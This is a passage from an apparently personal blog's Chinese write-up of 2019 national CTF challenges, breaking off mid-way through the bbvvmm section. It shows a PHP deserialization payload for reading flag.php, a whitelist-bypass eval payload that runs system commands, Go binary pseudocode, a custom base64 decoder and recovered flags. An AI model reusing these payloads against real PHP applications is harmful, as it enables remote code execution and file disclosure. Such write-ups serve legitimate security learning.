<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019国赛部分题目WP - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Justsoso"><span class="toc-text">Justsoso</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#love-math"><span class="toc-text">love_math</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方法"><span class="toc-text">利用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过名字可以推断出来这是一个go语言编译的程序"><span class="toc-text">通过名字可以推断出来这是一个go语言编译的程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：flag-92094daf-33c9-431e-a85a-8bfbd5df98ad"><span class="toc-text">flag：flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bbvvmm"><span class="toc-text">bbvvmm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-flag-eafd-134g-vp1d-vsdr-v5yg-ai0g-fsdg-g24t-sdfg"><span class="toc-text">flag:flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#your-pwn"><span class="toc-text">your_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-pwn"><span class="toc-text">baby_pwn</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019国赛部分题目WP
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-04-25 23:49:42</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>最近过于倒霉！！！！<br><a id="more"></a></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Justsoso"><a href="#Justsoso" class="headerlink" title="Justsoso"></a>Justsoso</h3><p>通过查看源代码发现存在文件包含漏洞，并给出一个提示hint.txt，通过php伪协议可以泄露出来index.php和hint.php<br><img src="https://s2.ax1x.com/2019/04/25/Eezw3F.png" alt> </p>
<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); </span><br><span class="line">$file = $_GET[&quot;file&quot;]; </span><br><span class="line">$payload = $_GET[&quot;payload&quot;];</span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line">    echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">    die(&apos;hack attacked!!!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">if(isset($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    parse_str($url[&apos;query&apos;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        if (preg_match(&quot;/flag/&quot;,$value)) &#123; </span><br><span class="line">            die(&apos;stop hacking!&apos;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;Missing parameters&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br></pre></td></tr></table></figure></p>
<p>hint.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">class Handle&#123;       </span><br><span class="line">    private $handle;        </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">            foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">                $this-&gt;$k = null;         </span><br><span class="line">            &#125;          </span><br><span class="line">            echo &quot;Waking upn&quot;;      </span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;           </span><br><span class="line">        $this-&gt;handle = $handle;       </span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;    </span><br><span class="line">        $this-&gt;handle-&gt;getFlag();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line">class Flag&#123;      </span><br><span class="line">    public $file;      </span><br><span class="line">    public $token;      </span><br><span class="line">    public $token_flag;         </span><br><span class="line">    function __construct($file)&#123;    </span><br><span class="line">        $this-&gt;file = $file;    </span><br><span class="line">        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));      </span><br><span class="line">    &#125;</span><br><span class="line">    public function getFlag()&#123;    </span><br><span class="line">        $this-&gt;token_flag = md5(rand(1,10000));          </span><br><span class="line">        if($this-&gt;token === $this-&gt;token_flag)&#123;     </span><br><span class="line">            if(isset($this-&gt;file))&#123;      </span><br><span class="line">                echo @highlight_file($this-&gt;file,true);               </span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>通过代码审计发现，存在两处漏洞</p>
<ol>
<li>通过”///“来绕过parse_url，<a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">一叶飘零师傅博客上的讲解</a> </li>
<li>通过反序列化漏洞开读取flag.php</li>
</ol>
<p>第二处漏洞利用的时候发现有一个比较，是两个随机数MD5值比较，$token是在我们这边生成的，但是$token_flag实在服务器那边生成的，相等的几率很小的，一开始我用的是爆破法，发现emmmm，不是太理想，后来想起来可以利用变量引用来绕过这个比较</p>
<p>生成payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">class Handle&#123;       </span><br><span class="line">    private $handle;        </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">            foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">                $this-&gt;$k = null;         </span><br><span class="line">            &#125;          </span><br><span class="line">            echo &quot;Waking upn&quot;;      </span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;           </span><br><span class="line">        $this-&gt;handle = new Flag();</span><br><span class="line">        $this-&gt;handle-&gt;token = &amp;$this-&gt;handle-&gt;token_flag;</span><br><span class="line">        $this-&gt;handle-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;    </span><br><span class="line">        $this-&gt;handle-&gt;getFlag();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line">class Flag&#123;      </span><br><span class="line">    public $file;   </span><br><span class="line">    public $token;      </span><br><span class="line">    public $token_flag;         </span><br><span class="line">    function __construct($file)&#123;    </span><br><span class="line">        $this-&gt;file = $file;    </span><br><span class="line">        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));      </span><br><span class="line">    &#125;</span><br><span class="line">    public function getFlag()&#123;    </span><br><span class="line">        $this-&gt;token_flag = md5(rand(1,10000));          </span><br><span class="line">        if($this-&gt;token === $this-&gt;token_flag)&#123;     </span><br><span class="line">            if(isset($this-&gt;file))&#123;      </span><br><span class="line">                echo @highlight_file($this-&gt;file,true);               </span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Handle();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>payload(需要注意的是handle的属性是private)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103///ctf/?file=hint.php&amp;payload=O:6:%22Handle%22:2:&#123;s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:&#123;s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;s:32:%2207bb5fdef1ee99d35eaccce14f8b5540%22;s:10:%22token_flag%22;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h3><p>题目给出部分源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span><br><span class="line">if(!isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    $content = $_GET[&apos;c&apos;]; </span><br><span class="line">    if (strlen($content) &gt;= 80) &#123; </span><br><span class="line">        die(&quot;太长了不会算&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; </span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span><br><span class="line">    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123; </span><br><span class="line">        if (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //帮你算出答案 </span><br><span class="line">    eval(&apos;echo &apos;.$content.&apos;;&apos;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>代码审计发现过滤了好多特殊字符，可以利用的函数只能用$whitelist里面的函数，最后我们输入的参数会与echo拼接再调用eval函数执行，如果我们想执行我们想要执行的代码，那么下手点必须在eval的参数里面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base_convert:在任意进制之间转换数字，返回一字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">bindec — 二进制转换为十进制</span><br><span class="line">decbin — 十进制转换为二进制</span><br><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">decoct — 十进制转换为八进制</span><br><span class="line">hexdec — 十六进制转换为十进制</span><br><span class="line">hex2bin转换十六进制字符串为二进制字符串。</span><br></pre></td></tr></table></figure>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>没有过滤$，我们可以通过异或来构造成_GET，虽然过滤了小括号，但是我们用大括号也可以取出来数组里的值<br>payload1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0=system&amp;1=whoami&amp;c=$pi=base_convert;$pi=$pi(1109136,10,36)^$pi(53179,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)</span><br></pre></td></tr></table></figure></p>
<p>这样的话，我们执行的命令可以利用另一个参数来控制，省去了不必要的长度</p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="通过名字可以推断出来这是一个go语言编译的程序"><a href="#通过名字可以推断出来这是一个go语言编译的程序" class="headerlink" title="通过名字可以推断出来这是一个go语言编译的程序"></a>通过名字可以推断出来这是一个go语言编译的程序</h3><p>载入IDA中发现该程序已经去符号化了，看着很不友好，网上有一个工具叫做golanghelper，可以恢复go程序的符号，那么用这个工具恢复之后，找到main函数（main_main）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main_main(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // r8</span><br><span class="line">  __int64 v3; // r9</span><br><span class="line">  __int64 v4; // r8</span><br><span class="line">  __int64 v5; // r9</span><br><span class="line">  __int64 v6; // rdx</span><br><span class="line">  __int64 v7; // rcx</span><br><span class="line">  __int64 v8; // r8</span><br><span class="line">  __int64 v9; // r9</span><br><span class="line">  __int128 v10; // ST00_16</span><br><span class="line">  __int64 v11; // ST18_8</span><br><span class="line">  int v12; // er8</span><br><span class="line">  __int64 v13; // r8</span><br><span class="line">  __int64 v14; // r9</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  __int64 v16; // rdx</span><br><span class="line">  __int64 v17; // r8</span><br><span class="line">  __int64 v18; // r9</span><br><span class="line">  __int64 v19; // rdx</span><br><span class="line">  __int64 v20; // r8</span><br><span class="line">  __int64 v21; // r9</span><br><span class="line">  __int64 v22; // r8</span><br><span class="line">  __int64 v23; // r9</span><br><span class="line">  __int64 v24; // [rsp+8h] [rbp-F8h]</span><br><span class="line">  __int64 v25; // [rsp+10h] [rbp-F0h]</span><br><span class="line">  char v26; // [rsp+58h] [rbp-A8h]</span><br><span class="line">  char v27; // [rsp+80h] [rbp-80h]</span><br><span class="line">  __int64 v28; // [rsp+98h] [rbp-68h]</span><br><span class="line">  __int64 v29; // [rsp+A0h] [rbp-60h]</span><br><span class="line">  __int128 v30; // [rsp+A8h] [rbp-58h]</span><br><span class="line">  __int128 v31; // [rsp+B8h] [rbp-48h]</span><br><span class="line">  __int128 v32; // [rsp+C8h] [rbp-38h]</span><br><span class="line">  __int128 v33; // [rsp+D8h] [rbp-28h]</span><br><span class="line">  __int128 v34; // [rsp+E8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  if ( (unsigned __int64)&amp;v27 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )</span><br><span class="line">    runtime_morestack_noctxt(a1, a2);</span><br><span class="line">  runtime_newobject(a1, a2);</span><br><span class="line">  v29 = v24;</span><br><span class="line">  *(_QWORD *)&amp;v34 = &amp;unk_4A6D00;</span><br><span class="line">  *((_QWORD *)&amp;v34 + 1) = &amp;off_4E1130;</span><br><span class="line">  fmt_Fprintln(a1, a2, (__int64)&amp;v34, (__int64)&amp;unk_4A6D00, v2, v3, (__int64)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  *(_QWORD *)&amp;v33 = &amp;unk_4A3E80;</span><br><span class="line">  *((_QWORD *)&amp;v33 + 1) = v29;</span><br><span class="line">  fmt_Fscanf(</span><br><span class="line">    a1,</span><br><span class="line">    a2,</span><br><span class="line">    (__int64)&amp;off_4E2880,</span><br><span class="line">    (__int64)&amp;v33,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    (__int64)&amp;off_4E2880,</span><br><span class="line">    qword_572B10,</span><br><span class="line">    (__int64)&amp;unk_4C8569,</span><br><span class="line">    2LL);</span><br><span class="line">  runtime_stringtoslicebyte(a1, a2, v6, v7, v8, v9);</span><br><span class="line">  *(_QWORD *)&amp;v10 = &amp;v26;</span><br><span class="line">  *((_QWORD *)&amp;v10 + 1) = v11;</span><br><span class="line">  runtime_slicebytetostring(a1, a2, v11, 1, v12, v10);</span><br><span class="line">  encoding_base64__ptr_Encoding_DecodeString(a1, a2, 1LL, (__int64)&amp;v33, v13, v14, qword_572B00, (__int64)&amp;v33, 1uLL);</span><br><span class="line">  v28 = 1LL;</span><br><span class="line">  MEMORY[0x19](a1);</span><br><span class="line">  runtime_convTstring(a1, a2, v19);</span><br><span class="line">  *(_QWORD *)&amp;v32 = &amp;unk_4A6D00;</span><br><span class="line">  *((_QWORD *)&amp;v32 + 1) = v25;</span><br><span class="line">  fmt_Fprintln(a1, a2, (__int64)&amp;off_4E28A0, (__int64)&amp;unk_4A6D00, v20, v21, (__int64)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  if ( *(__int128 **)(v29 + 8) == &amp;v33 )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_memequal(a1, a2, v28, *(_QWORD *)v29);</span><br><span class="line">    *(_QWORD *)&amp;v31 = &amp;unk_4A6D00;</span><br><span class="line">    *((_QWORD *)&amp;v31 + 1) = &amp;off_4E1140;</span><br><span class="line">    result = fmt_Fprintln(a1, a2, v16, (__int64)&amp;off_4E28A0, v17, v18, (__int64)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;v30 = &amp;unk_4A6D00;</span><br><span class="line">    *((_QWORD *)&amp;v30 + 1) = &amp;off_4E1150;</span><br><span class="line">    result = fmt_Fprintln(a1, a2, v28, (__int64)&amp;off_4E28A0, v22, v23, (__int64)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致扫一眼发现存在base64加密，然后发现有几个特殊的字符串引用<br><img src="https://s2.ax1x.com/2019/04/25/EezEnA.png" alt><br><img src="https://s2.ax1x.com/2019/04/25/EezmAP.png" alt><br>推断出这是一个魔改base64，然后解密即可得到flag</p>
<p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def mybase64decode(ciphertext):</span><br><span class="line">	index_table = &quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;</span><br><span class="line">	num=0</span><br><span class="line">	for x in range(len(ciphertext)):</span><br><span class="line">		if ciphertext[x]==&quot;=&quot;:</span><br><span class="line">			num+=1</span><br><span class="line">	ciphertext =ciphertext.replace(&quot;=&quot;,&quot;&quot;)</span><br><span class="line">	arr = []</span><br><span class="line">	for x in range(len(ciphertext)):</span><br><span class="line">		arr.append(index_table.index(ciphertext[x]))</span><br><span class="line">	binary_str = &quot;&quot;</span><br><span class="line">	for y in range(len(arr)):</span><br><span class="line">		binary_str+=bin(arr[y])[2:].rjust(6,&quot;0&quot;)</span><br><span class="line">	binary_str = binary_str[0:len(binary_str)-(num*(8-6))]</span><br><span class="line">	plaintext = &quot;&quot;</span><br><span class="line">	for x in range(0,len(binary_str),8):</span><br><span class="line">		plaintext+=chr(eval(&quot;0b&quot;+binary_str[x:x+8]))</span><br><span class="line">	return plaintext</span><br><span class="line"></span><br><span class="line">print mybase64decode(&quot;tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3&quot;)</span><br></pre></td></tr></table></figure></p>
<p>但是我在做的时候并没有这样做，我首先看到mian函数中有一个if判断，然后在gdb中在if处下断点，然后就可以看到flag了，emmm<br><img src="https://s2.ax1x.com/2019/04/25/Eezuh8.png" alt> </p>
<h4 id="flag：flag-92094daf-33c9-431e-a85a-8bfbd5df98ad"><a href="#flag：flag-92094daf-33c9-431e-a85a-8bfbd5df98ad" class="headerlink" title="flag：flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}"></a>flag：flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</h4><h3 id="bbvvmm"><a href="#bbvvmm" class="headerlink" title="bbvvmm"></a>bbvvmm</h3><p>任然是elf文件</p>
<p>首先看到main函数中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 